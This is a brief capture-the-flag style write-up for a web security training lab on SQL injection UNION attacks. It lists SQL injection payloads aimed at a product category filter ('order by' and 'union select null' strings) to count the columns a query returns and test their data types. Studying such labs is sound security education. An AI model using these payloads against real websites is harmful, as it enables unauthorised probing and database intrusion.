# SQL injection UNION attack, determining the number of columns returned by the query

1. SQLi: product category filter.
2. Goal: determine the number of columns.

### Analysis
- Website target: `https://0a12009f035675db839151fe008e0055.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: URL encode.

1. Find the number of columns.
```sql
' order by 3--
'-- I found 3 columns.
```

2. Find the data type of columns.
```sql
' union select null, null, null-- 
'-- or
' union select '1', '1', '1'--
```